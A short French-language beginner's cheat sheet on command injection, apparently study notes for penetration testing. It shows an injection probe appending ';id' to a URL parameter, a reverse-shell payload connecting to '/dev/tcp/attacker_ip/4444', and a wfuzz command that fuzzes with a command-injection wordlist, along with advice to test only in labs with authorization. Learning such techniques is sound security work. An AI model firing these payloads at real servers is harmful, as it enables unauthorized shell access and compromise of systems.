# Command Injection (Injection de Commandes)

## Objectif
Exploiter une faille pour exécuter des commandes système sur le serveur via un paramètre web vulnérable.

---

## Commandes essentielles et explications

### 1. Détection de la vulnérabilité
- Tester des payloads dans un paramètre :
```
http://target.com/page.php?ip=127.0.0.1;id
```
- **À quoi ça sert ?** Si la sortie de la commande `id` s’affiche, la page est vulnérable à l’injection de commandes.
- **Astuce débutant** : Tester aussi avec `|`, `&&`, `||` selon le langage du backend.

### 2. Exploitation avancée
- Reverse shell via injection :
```
http://target.com/page.php?ip=127.0.0.1;bash -i >& /dev/tcp/attacker_ip/4444 0>&1
```
- **À surveiller** : Exécution de commandes, ouverture d’une connexion vers ta machine.

### 3. Utilisation d’outils automatisés
```bash
wfuzz -c -w /usr/share/wordlists/wfuzz/Injections/commands.txt --hh 0 "http://target.com/page.php?ip=FUZZ"
```
- **wfuzz** : Fuzzer pour tester de nombreux payloads automatiquement.
- **--hh 0** : Ignore les réponses vides.

---

## Conseils pour débutants
- Toujours tester d’abord en manuel, puis automatiser avec wfuzz ou ffuf.
- Ne pas négliger les messages d’erreur affichés par le site.
- Tester sur des environnements de lab, jamais en production sans autorisation.
- Lire la documentation de chaque outil pour découvrir des options avancées.

---

## Pour aller plus loin
- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection) 